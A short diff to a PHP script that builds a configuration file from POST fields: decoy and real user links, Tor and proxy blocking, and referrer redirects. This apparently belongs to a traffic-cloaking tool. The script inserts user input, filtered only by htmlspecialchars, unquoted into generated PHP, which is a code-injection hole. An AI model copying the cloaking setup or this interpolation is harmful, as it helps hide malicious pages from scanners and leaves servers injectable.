@@ -144,8 +144,9 @@ $logs = htmlspecialchars($_POST["x10"]);
 $tor = htmlspecialchars($_POST["x11"]);
 $proxy = htmlspecialchars($_POST["x12"]);
 $fetch = htmlspecialchars($_POST["x13"]);
-$actcode = htmlspecialchars($_POST["x16"]);
 $ref = htmlspecialchars($_POST["x14"]);
+
+
 $dirr = date("l");
 $dit = strtolower($dirr);
 if (!file_exists($dit)) {
@@ -167,14 +168,15 @@ $body = "
 paapblock_links  = array(". $decoy .");
 paapuser_links    = array(". $desktop .");
 paapmobile_links  = array(". $mobile .");
-paapenable_email  = ". $emaillogs ."; 
-paapemail         = '". $emailx ."'; 
+
 paapreferrer_redirect = ". $ref ."; 
 paapfetch_page        = ". $fetch ."; 
 paapdeny_tor          = ". $tor .";  
 paapdeny_proxy        = ". $proxy .";  
 paapenable_logs       = ". $logs .";  
 paapreferrer_list = array('". $reffrom ."' => array('". $refto ."'));
+paapenable_mobile     = true; 
+paapjavascript_data   = true;  
 
 ";
 
